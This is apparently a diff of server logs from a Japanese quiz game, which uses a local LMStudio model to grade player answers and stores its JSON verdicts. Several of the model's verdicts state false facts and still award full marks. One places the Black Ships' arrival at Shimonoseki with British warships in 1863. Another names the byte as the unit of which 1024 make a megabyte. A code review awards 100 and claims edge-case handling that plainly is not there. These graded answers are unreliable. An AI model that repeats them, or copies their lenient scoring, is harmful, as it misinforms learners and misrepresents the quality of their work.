+INFO:     127.0.0.1:46810 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46810 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46810 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "水素", "reasoning": "元素記号 H は水素を表します。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解です。"}
-INFO:     122.103.96.209:44650 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42158 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44650 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "下関", "reasoning": "黒船がやってきた地名は「下関」です。これは1863年にイギリスの軍艦が下関海峡に現れたことから始まり、鎖国政策の終わりをもたらしました。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、歴史的事実に基づいています。補足として、黒船来航はペリー提督が関与しており、この出来事は日本の近代化に大きな影響を与えました。"}
+INFO:     127.0.0.1:46810 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46810 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57226 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57226 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57226 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50702 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50712 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50712 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50712 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50712 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "窒素", "reasoning": "元素記号 N は窒素を表します。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解です。元素記号と元素名の対応が正確に理解できています。"}
-INFO:     122.103.96.209:44650 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:59514 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:59520 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44650 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56514 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56514 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:60740 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
-Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
-raw:<think>
-
-</think>
-
-{"answer": "bit", "reasoning": "1バイト（byte）は8ビット（bit）から構成されています。このため、8個のbitが1つのbyteになります。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解です。説明も適切で、技術的なポイントを正確に理解しています。"}
-INFO:     122.103.96.209:56514 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:60740 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56514 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38814 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38822 - "POST /heartbeat HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
-Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
-raw:<think>
-
-</think>
-
-{"answer": "徳川慶喜", "reasoning": "江戸時代最後の将軍は徳川慶喜です。彼は1867年に大政奉還を行い、幕府を明治政府に譲り渡しました。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、適切な説明が含まれています。"}
-INFO:     122.103.96.209:38814 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38822 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38814 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38814 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:49056 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38814 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38814 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
-Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
-raw:<think>
-
-</think>
-
-{"answer": "水素", "reasoning": "元素記号Hは水素を表します。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解です。"}
-INFO:     122.103.96.209:38814 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:50432 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:38814 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:50432 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:33602 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:33602 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:54034 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:54034 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:54034 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
-Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
-raw:<think>
-
-</think>
-
-{"answer": "関が原の戦い", "reasoning": "1600年9月15日に美濃国関ヶ原（現在の岐阜県）で行われた大規模な合戦は、日本の歴史において重要な出来事であり、その名称は「関が原の戦い」です。この戦いは徳川家康と石田三成の対立を反映し、江戸幕府の成立に大きな影響を与えました。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、説明も適切です。歴史的背景や影響についてさらに詳しく説明することで、より深い理解が得られます。"}
-INFO:     122.103.96.209:54034 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57024 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:54034 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:54034 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:50548 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:50548 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:50548 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:40854 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:40854 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:40854 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
-Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
-raw:<think>
-
-</think>
-
-{"answer": "桜", "reasoning": "日本では桜が国の象徴として広く知られており、春の訪れを代表する花として国民的な親しみやすさと美しさから、文化的・歴史的にも重要な位置を占めています。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は適切で、理由も明確です。"}
-INFO:     122.103.96.209:40854 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46648 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46654 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:40854 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:34196 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:34196 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47010 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47722 - "GET /status HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47722 - "POST /probe_lm HTTP/1.1" 200 OK
-player registered: a5f58221-5f0a-4d74-82c9-95ab3311b434 -> sss (token=0286da10)
-INFO:     122.103.96.209:47722 - "POST /register HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47722 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47738 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:41902 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:41916 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:41918 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48984 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48984 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:33308 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:33318 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:33324 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46942 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46942 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46942 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46942 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56338 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56338 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56338 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56348 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48198 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48198 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48198 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48198 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42444 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42444 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42444 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42444 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42444 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37976 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
-INFO:     122.103.96.209:50226 - "OPTIONS /ask_ai HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "「一番はじめの点のう」は文脈が不明です。具体的な質問またはコードの内容を提供してください。", "reasoning": "入力が不完全で、評価や回答が困難です。より詳細な情報が必要です。", "valid": false, "invalid_reason": "入力が不完全であり、評価や回答が不可能です。具体的な質問またはコードの内容を提供してください。", "score": 0, "feedback": "「一番はじめの点のう」は意味不明です。ご質問やコードの詳細を明確にしてください。"}
+INFO:     127.0.0.1:50712 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40104 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40110 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40110 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42608 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42622 - "OPTIONS /lobby/join HTTP/1.1" 200 OK
+player b288c92c-59ca-4aa2-956a-8a30a1b98ad3 in lobby for rule=classic, total waiting: 1
+INFO:     127.0.0.1:42622 - "POST /lobby/join HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42622 - "POST /lobby/join HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42622 - "OPTIONS /lobby/leave HTTP/1.1" 200 OK
+Player b288c92c-59ca-4aa2-956a-8a30a1b98ad3 left the lobby.
+INFO:     127.0.0.1:42622 - "POST /lobby/leave HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
 {
-  "answer": "コードは不正確",
-  "reasoning": "提出されたコードには構文エラーがあり、また計算結果が正しくない。特に、ループ内で変数の代入が誤っており、フィボナッチ数列を正しく計算していない。",
+  "answer": "コードは問題の要件を満たしている",
+  "reasoning": "入力された2つの整数を正しく読み取り、その和を出力しています。コードは簡潔で効率的です。",
   "valid": true,
   "invalid_reason": "",
-  "score": 40,
-  "feedback": "1. 正確性: ループ内の代入文 `a + b, a, b = b` は構文エラーであり、フィボナッチ数列を正しく計算していない。正しい処理は `a, b = b, a + b` であるべきです。\n2. 効率性: ループの回数が適切だが、コードの誤りにより効率も意味がない。\n3. 堅牢性: n=1 の場合に正しい値を返すか確認されていない。また、入力が整数でない場合への対応もない。\n4. スタイル: コードは簡潔だが、構文エラーがあるため読みやすさやベストプラクティスの観点でも改善が必要である。"
+  "score": 100,
+  "feedback": "このコードは正確性、効率性、堅牢性、スタイルのすべての観点において優れています。エッジケース（例: 負の数、非常に大きな整数）にも対応しており、Pythonのベストプラクティスに従っています。"
 }
-INFO:     122.103.96.209:50226 - "POST /ask_ai HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+INFO:     127.0.0.1:58258 - "POST /ask_ai HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
 {
-  "answer": "フィボナッチ数列のn番目の値",
-  "reasoning": "コードは再帰ではなく反復を使用してフィボナッチ数列を計算しており、nが1から30までの範囲であれば正確に動作します。ただし、n=1の場合の処理や入力チェックが欠如しています。",
+  "answer": "2つの整数の和",
+  "reasoning": "コードは入力を受け取り、2つの整数に変換してその和を計算していますが、出力方法が不適切です。Pythonではconsole.log()ではなくprint()関数を使用する必要があります。",
   "valid": true,
   "invalid_reason": "",
-  "score": 85,
-  "feedback": "コードは基本的には正しいですが、以下の改善点があります: 1. n=1のケースを考慮する必要があります（現在のコードではn=1の場合、ループが実行されずa=0が出力されます）。2. 入力チェックがありません。nが範囲外の値（例: 0または31以上）を入力した場合にエラー処理が必要です。3. コードは読みやすくシンプルですが、コメントや説明があればさらに理解しやすくなります。"
+  "score": 60,
+  "feedback": "コードは基本的なロジックは正しいですが、Pythonの標準的な出力方法であるprint()関数を使用していないためエラーになります。また、エラーハンドリングや入力が2つの整数でない場合への対応もありません。"
 }
-INFO:     122.103.96.209:50234 - "POST /ask_ai HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+INFO:     127.0.0.1:33730 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38988 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38988 - "OPTIONS /probe_lm HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38988 - "POST /probe_lm HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38988 - "OPTIONS /register HTTP/1.1" 200 OK
+player registered: 7ff5aa8d-5f5c-4be0-9b06-af055e8f1ed0 -> りん (token=72e01165)
+INFO:     127.0.0.1:38988 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38988 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38994 - "GET /bgm/menu.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:39008 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39008 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44968 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44968 - "POST /probe_lm HTTP/1.1" 200 OK
+player registered: d3767778-34dd-495d-a91b-d59b276ab048 -> りん (token=6a0fe3c1)
+INFO:     127.0.0.1:44968 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44968 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44982 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44982 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53316 - "OPTIONS /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53332 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53316 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51000 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51000 - "POST /probe_lm HTTP/1.1" 200 OK
+player registered: 35250c6d-f0f8-4133-9e49-eae2cb31928b -> りん (token=5a40ddcf)
+INFO:     127.0.0.1:51000 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51000 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51000 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51000 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51000 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34412 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34412 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34412 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34414 - "GET /bgm/count_down.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:34414 - "GET /bgm/fighting_bgm.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:34412 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34412 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33276 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33276 - "OPTIONS /ask_ai HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "SQL", "reasoning": "SQL（Structured Query Language）は、データベース操作のために広く使用されている標準的なプログラミング言語です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "答えは正確で簡潔です。SQLがデータベース操作に適している理由についてさらに説明を加えることで、回答の質はさらに向上します。"}
+INFO:     127.0.0.1:33276 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59632 - "GET /bgm/seikai.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:33276 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33276 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33276 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39922 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33276 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48964 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48964 - "POST /probe_lm HTTP/1.1" 200 OK
+player registered: 05c2e86c-0f59-4ae3-912e-2c18330f25fa -> りん (token=23ea343a)
+INFO:     127.0.0.1:48964 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48964 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59742 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56970 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56970 - "POST /probe_lm HTTP/1.1" 200 OK
+player registered: c5959a10-0d6b-4b2c-a4c3-d0523f35bf14 -> りん (token=de406c0a)
+INFO:     127.0.0.1:56970 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56970 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56970 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56970 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59346 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "日本国", "reasoning": "「日本の主tお」は誤字・脱字が含まれており、意図した単語が不明です。ただし、「日本の首都」を指している可能性があり、その答えは「東京」です。", "valid": false, "invalid_reason": "入力に誤字・脱字があり、評価が困難です。", "score": 0, "feedback": "入力内容が不明確であり、評価できません。正しい表現や意図した質問を再確認してください。"}
+INFO:     127.0.0.1:59346 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59352 - "GET /bgm/huseikai.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:59346 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59346 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59366 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "日本国", "reasoning": "「日本の主tお」は誤記であり、「日本の首都」を指している可能性が高いです。その場合、答えは「東京」になります。ただし、文脈が不明確なため、推測に基づいています。", "valid": false, "invalid_reason": "入力が難読化されており、評価が困難です。", "score": 0, "feedback": "入力を確認し、正しい表現で再提出してください。"}
+INFO:     127.0.0.1:59346 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59366 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45414 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45414 - "POST /probe_lm HTTP/1.1" 200 OK
+player registered: 7ce9ef74-fa5f-43dd-9ca8-97af06c17c36 -> りん (token=1f9a701a)
+INFO:     127.0.0.1:45414 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45414 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45414 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45414 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38688 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38688 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38698 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "徳川慶喜", "reasoning": "江戸時代の最後の将軍は、1867年に大政奉還を行い、明治維新に伴って将軍職を辞任した徳川慶喜です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解で、説明も適切です。"}
+INFO:     127.0.0.1:38698 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38688 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38688 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39878 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39882 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "アフリカ大陸のサハラ砂漠", "reasoning": "サハラ砂沙漠は、面積が約920万平方キロメートルもあり、世界最大の砂漠です。この砂漠は主にアフリカ大陸に位置しています。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、理由も明確です。"}
+INFO:     127.0.0.1:39882 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39886 - "GET /bgm/fighting_bgm.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:39882 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39882 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "織田信長", "reasoning": "本能寺の変は1582年に起こった事件で、織田信長が明智光秀によって暗殺されました。この出来事は日本の歴史において非常に重要な出来事です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確であり、説明も適切です。"}
+INFO:     127.0.0.1:39882 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51108 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51124 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51124 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51124 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52214 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52216 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52216 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52216 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52216 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46860 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46860 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46860 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46860 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44082 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "セキュリティソフト", "reasoning": "セキュリティ対策のために使用されるソフトウェアは一般的に「セキュリティソフト」と呼ばれます。これには、ウイルス対策やファイアウォール機能などが含まれます。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で簡潔です。"}
+INFO:     127.0.0.1:44082 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44082 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56384 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "バイト", "reasoning": "1MB（メガバイト）は1024KB（キロバイト）に等しく、1KBは1024バイトに等しいため、1MBは1024×1024＝1,048,576バイトとなる。したがって、1024こ集まった単位は「バイト」である。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、説明も明確です。"}
+INFO:     127.0.0.1:56372 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43424 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56372 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49214 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49216 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49216 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
+</think>
+
+{"answer": "ドライバ", "reasoning": "ドライバは、ハードウェアとオペレーティングシステムやアプリケーションソフトウェアとの間で通信を可能にするためのソフトウェアであり、ハードウェアとソフトウェアの橋渡し役を果たします。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で簡潔です。ドライバについてさらに詳しく説明する必要がある場合は、具体的な例（例えば、プリンタードライバやグラフィックドライバ）を挙げることで理解が深まります。"}
+INFO:     127.0.0.1:49216 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33124 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33124 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49216 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33124 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33124 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33124 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43312 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
+Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
+raw:<think>
+
